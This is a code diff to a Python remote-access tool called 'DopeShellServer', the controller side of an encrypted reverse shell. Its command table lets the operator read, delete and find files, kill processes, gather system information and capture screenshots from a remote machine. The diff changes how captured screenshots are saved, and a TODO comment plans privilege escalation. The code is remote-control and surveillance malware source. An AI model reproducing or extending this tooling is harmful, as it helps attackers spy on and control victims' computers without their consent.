@@ -2,8 +2,6 @@
 # TODO:
 # fix hanging when sessions connect quickly.
 # add location and privilege escalation
-=======
-# differentiate between folders and files in LS command
 import socket
 import threading
 import base64
@@ -14,6 +12,7 @@ import argparse
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 import sys
+from datetime import datetime
 
 BANNER = r"""
 ______                      _____  _            _  _ 
@@ -67,14 +66,13 @@ class DopeShellServer:
             'netstat': 'Show network connections on the remote machine.',
             'ifconfig/ipconfig': 'Show network configuration (depending on OS).',
             'cat <file_path>': 'Display the contents of a file on the remote machine.',
-            'info': 'Display system information of the remote machine.',
+            'screenshot' : 'Capture a screenshot of the remote machine\'s screen and save it in current directory',
             'mkdir <directory>': 'Create a new directory on the remote machine.',
             'delete <file_path>': 'Delete a file on the remote machine.',
             'kill <pid>': 'Kill a process on the remote machine by PID.',
             'clear': 'Clear the screen in the shell.',
             'find <filename>': 'Find a file by name on the remote machine.',
             'sysinfo': 'Display detailed system information.',
-            'screenshot':'capture screenshot of remote machine screen.',
         }
 
     def receive_data(self, client_socket):
@@ -161,12 +159,12 @@ class DopeShellServer:
                 client_socket.send(self.encrypt(b"screenshot"))
 
                 # Save the screenshot data to a file
-                with open('screenshot.png', 'wb') as f:
-                    while True:
-                        file_data = self.receive_data(client_socket)
-                        if file_data == b'EOF':
-                            break
-                        f.write(file_data)
+                now = datetime.now()
+                # Format the timestamp as dd-mm-yyyy-hh-mm-ss
+                timestamp = now.strftime("%d-%m-%Y-%H-%M-%S")
+                with open('screenshot'+ timestamp +'.png', 'wb') as f:
+                    file_data = self.receive_data(client_socket)
+                    f.write(file_data)
 
                 print(f"[+] Downloaded Screenshot from the client as screenshot.png")
 
